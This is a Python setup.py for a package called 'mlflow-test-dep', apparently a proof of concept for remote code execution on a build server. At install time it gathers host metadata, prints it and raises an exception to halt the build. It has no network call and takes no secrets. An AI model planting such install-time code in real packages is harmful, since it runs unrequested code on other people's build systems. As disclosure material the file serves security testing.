import os
import sys
import platform
import socket
from setuptools import setup

# SAFE PROOF: Gather system metadata. NO secrets, NO exfiltration.
proof = "🚨🚨🚨 BUILD_SERVER_RCE_PROOF 🚨🚨🚨\n"
proof += f"Python Version: {sys.version.split()[0]}\n"
proof += f"OS Platform: {platform.platform()}\n"
proof += f"Hostname: {socket.gethostname()}\n"
proof += f"Working Directory: {os.getcwd()}\n"
proof += f"Effective User: {os.getenv('USER', 'unknown')}\n"
proof += f"Process ID: {os.getpid()}\n"

# Print to stdout (shows up in build logs)
print(proof)

# Raise exception to guarantee it halts the build and is highlighted in Databricks UI
raise Exception(proof)

setup(
    name="mlflow-test-dep",
    version="0.1",
    description="A safe RCE proof of concept"
)
